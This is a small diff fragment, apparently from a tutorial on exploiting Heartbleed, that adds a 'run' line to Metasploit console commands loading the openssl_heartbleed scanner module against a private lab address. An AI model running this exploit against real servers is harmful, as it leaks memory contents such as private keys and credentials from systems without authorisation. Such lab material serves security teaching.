@@ -20,6 +20,7 @@ You can exploit the vulnerability in many different ways. There is a module for 
 use auxiliary/scanner/ssl/openssl_heartbleed
 set RHOSTS 192.168.101.8
 set verbose true
+run
 ```
 
 
